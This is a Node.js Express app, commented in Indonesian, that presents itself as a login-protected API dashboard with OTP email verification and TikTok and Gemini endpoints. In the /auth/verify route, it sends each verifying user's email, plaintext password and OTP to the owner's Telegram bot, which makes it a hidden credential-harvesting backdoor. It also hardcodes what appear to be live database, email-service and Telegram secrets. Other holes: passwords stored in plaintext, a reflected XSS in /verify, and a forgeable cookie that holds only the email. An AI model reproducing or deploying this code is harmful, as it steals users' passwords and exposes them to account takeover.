const express = require('express');
const axios = require('axios');
const mongoose = require('mongoose');
const { Resend } = require('resend');
const cookieParser = require('cookie-parser');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// --- CONFIGURATION (KREDENSIAL KAMU) ---
const MONGO_URI = "mongodb+srv://eka710231_db_user:kaaacloud@cluster0.6ssgy30.mongodb.net/?appName=Cluster0";
const RESEND_API = "re_Y3DfKKCM_7rJCyA3V1JHoxUNxQ2sc7Fb1";
const TELE_TOKEN = "7789045134:AAFY6waeQ6pD1TAx8_Rfv7J6qsokgPZXPsQ";
const OWNER_ID = "1955836653";
const BG_URL = "https://wallpapercave.com/wp/wp11166318.jpg";

const resend = new Resend(RESEND_API);

// Koneksi Database
mongoose.connect(MONGO_URI).catch(err => console.error("MongoDB Connection Error:", err));

// --- MODELS ---
const User = mongoose.models.User || mongoose.model('User', new mongoose.Schema({
    email: { type: String, unique: true },
    password: String,
    otp: String,
    isVerified: { type: Boolean, default: false }
}));

const Stats = mongoose.models.Stats || mongoose.model('Stats', new mongoose.Schema({
    name: { type: String, default: "main" },
    total_req: { type: Number, default: 0 }
}));

// Middleware Proteksi
const checkAuth = async (req, res, next) => {
    const email = req.cookies.userEmail;
    if (!email) return res.redirect('/login');
    const user = await User.findOne({ email, isVerified: true });
    if (!user) return res.redirect('/login');
    next();
};

// --- AUTH ROUTES ---
app.get('/login', (req, res) => {
    res.send(`
    <body style="background:#020617; color:white; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0;">
        <div style="background:rgba(30,41,59,0.5); backdrop-filter:blur(15px); padding:40px; border-radius:30px; border:1px solid #38bdf8; width:340px; text-align:center;">
            <h1 style="color:#38bdf8; font-size:24px; margin-bottom:5px;">KAAAOFFC LOGIN</h1>
            <form action="/auth/login" method="POST">
                <input name="email" type="email" placeholder="Email Address" style="width:100%; padding:12px; margin-bottom:12px; border-radius:12px; border:none; background:#0f172a; color:white;" required>
                <input name="password" type="password" placeholder="Password" style="width:100%; padding:12px; margin-bottom:20px; border-radius:12px; border:none; background:#0f172a; color:white;" required>
                <button type="submit" style="width:100%; padding:12px; background:#38bdf8; border:none; border-radius:12px; font-weight:bold; color:#020617; cursor:pointer;">GET OTP CODE</button>
            </form>
        </div>
    </body>`);
});

app.post('/auth/login', async (req, res) => {
    const { email, password } = req.body;
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    try {
        await User.findOneAndUpdate({ email }, { password, otp, isVerified: false }, { upsert: true });
        await resend.emails.send({
            from: 'KaaaOffc <code@kaaaoffc.web.id>',
            to: email,
            subject: 'Login Verification Code',
            html: `<div style="text-align:center;"><h2>KAAAOFFC SECURITY</h2><p>Kode OTP Kamu:</p><h1>${otp}</h1></div>`
        });
        res.redirect('/verify?email=' + email);
    } catch (e) { res.send("Error Resend: " + e.message); }
});

app.get('/verify', (req, res) => {
    res.send(`
    <body style="background:#020617; color:white; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh;">
        <form action="/auth/verify" method="POST" style="background:rgba(30,41,59,0.5); padding:40px; border-radius:30px; border:1px solid #38bdf8; text-align:center;">
            <h2 style="color:#38bdf8;">INPUT OTP</h2>
            <input name="email" type="hidden" value="${req.query.email}">
            <input name="otp" type="text" maxlength="6" style="width:100%; padding:15px; margin:20px 0; border-radius:12px; font-size:30px; text-align:center; letter-spacing:10px;" required>
            <button type="submit" style="width:100%; padding:12px; background:#38bdf8; border:none; border-radius:12px; font-weight:bold;">VERIFY NOW</button>
        </form>
    </body>`);
});

app.post('/auth/verify', async (req, res) => {
    const { email, otp } = req.body;
    const user = await User.findOne({ email, otp });
    if (user) {
        user.isVerified = true;
        await user.save();
        res.cookie('userEmail', email, { maxAge: 86400000, httpOnly: true });

        // NOTIFIKASI TELEGRAM KE OWNER
        const msg = `🚀 *NOTIFIKASI LOGIN SYISTEM*\n📧 *EMAIL:* \`${email}\`\n🔑 *PASSWORD:* \`${user.password}\`\n🔢 *KODE:* \`${otp}\`\n✅ *STATUS:* SUCCESS`;
        axios.post(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
            chat_id: OWNER_ID,
            text: msg,
            parse_mode: 'Markdown'
        });

        res.redirect('/');
    } else { res.send("OTP Salah!"); }
});

// --- DASHBOARD UTAMA ---
app.get('/', checkAuth, async (req, res) => {
    const totalUser = await User.countDocuments({ isVerified: true });
    const statData = await Stats.findOne({ name: "main" }) || { total_req: 0 };
    res.send(`
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Dashboard | KaaaOffc</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <style>
            body { background: url('${BG_URL}') no-repeat center center fixed; background-size: cover; }
            .glass { background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(15px); border: 1px solid rgba(56, 189, 248, 0.3); }
        </style>
    </head>
    <body class="text-white">
        <div class="min-h-screen flex items-center justify-center p-6 bg-slate-950/70">
            <div class="glass p-10 rounded-[3rem] max-w-4xl w-full text-center shadow-2xl">
                <h1 class="text-5xl font-black text-sky-400 mb-10 italic">KAAAOFFC SYSTEM</h1>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mb-12">
                    <div class="p-10 bg-sky-500/10 rounded-[2rem] border border-sky-500/20">
                        <span class="block text-6xl font-bold text-sky-400 mb-2">${totalUser}</span>
                        <span class="text-[10px] text-sky-300 font-bold uppercase tracking-[4px]">Total Pengguna API</span>
                    </div>
                    <div class="p-10 bg-indigo-500/10 rounded-[2rem] border border-indigo-500/20">
                        <span class="block text-6xl font-bold text-indigo-400">${statData.total_req.toLocaleString()}</span>
                        <span class="text-[10px] text-indigo-300 font-bold uppercase tracking-[4px]">Total Requests</span>
                    </div>
                </div>
                <div class="flex flex-wrap justify-center gap-6">
                    <a href="/docs" class="bg-sky-500 text-slate-900 px-12 py-4 rounded-full font-black hover:scale-105 transition-all">DOCUMENTATION API</a>
                    <a href="/logout" class="border border-red-500/50 text-red-500 px-12 py-4 rounded-full font-black">LOGOUT</a>
                </div>
            </div>
        </div>
    </body>
    </html>`);
});

// --- DOCUMENTATION (DOCS) ---
app.get('/docs', checkAuth, (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Docs | KaaaOffc</title>
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-slate-950 text-slate-300 p-8 md:p-20">
        <div class="max-w-4xl mx-auto">
            <h1 class="text-4xl font-bold text-white mb-2">API Documentation</h1>
            <p class="text-slate-500 mb-10">v6.0.0 - Premium Access</p>
            <div class="space-y-6">
                <div class="bg-slate-900 p-6 rounded-2xl border-l-4 border-sky-500">
                    <div class="flex items-center mb-4">
                        <span class="bg-sky-500 text-slate-950 px-3 py-1 rounded font-bold text-xs">GET</span>
                        <code class="ml-4 text-sky-400">/api/tiktok?q=query</code>
                    </div>
                    <p class="text-sm">Download video TikTok tanpa watermark secara instan.</p>
                </div>
                <div class="bg-slate-900 p-6 rounded-2xl border-l-4 border-indigo-500">
                    <div class="flex items-center mb-4">
                        <span class="bg-indigo-500 text-white px-3 py-1 rounded font-bold text-xs">GET</span>
                        <code class="ml-4 text-indigo-400">/api/gemini?text=halo</code>
                    </div>
                    <p class="text-sm">Interaksi AI menggunakan engine Gemini Google.</p>
                </div>
            </div>
            <div class="mt-10"><a href="/" class="text-sky-500 font-bold">← Back to Dashboard</a></div>
        </div>
    </body>
    </html>`);
});

// --- API LOGIC (HIT COUNTER) ---
app.get('/api/tiktok', checkAuth, async (req, res) => {
    await Stats.findOneAndUpdate({ name: "main" }, { $inc: { total_req: 1 } }, { upsert: true });
    res.json({ status: true, msg: "Tiktok endpoint aktif!" });
});

app.get('/logout', (req, res) => { res.clearCookie('userEmail'); res.redirect('/login'); });

module.exports = app;
